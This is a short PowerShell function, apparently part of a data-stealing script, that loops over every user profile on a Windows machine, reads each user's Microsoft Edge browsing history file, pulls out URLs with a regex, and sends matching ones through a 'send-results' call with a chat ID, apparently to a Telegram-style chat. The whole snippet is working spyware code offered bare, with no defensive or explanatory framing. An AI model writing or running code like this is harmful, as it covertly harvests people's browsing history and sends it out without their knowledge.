function edge{
  $Folders = Get-ChildItem -Directory "C:\Users" | Where-Object {($_.Name -notlike "Public") -and ($_.Name -notlike "Administrador")}
  $Out = ''
  Foreach($Folder in $Folders) {
    $UserName = $Folder
    $Path = "$Env:systemdrive\Users\$UserName\AppData\Local\Microsoft\Edge\User Data\Default\History" 
    if (-not (Test-Path -Path $Path)) { 
      Write-Verbose "[!] Could not find Edge History for username: $UserName" 
    } 
    $Regex = '(http(|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
    $Value = Get-Content -Path "$Env:systemdrive\Users\$UserName\AppData\Local\Microsoft\Edge\User Data\Default\History"|Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique 
    $Value | ForEach-Object { 
      $Key = $_ 
      if ($Key -match $Site){ 
        send-results -chat_id $chat_id -texto $_
        } 
      } 
    }
}
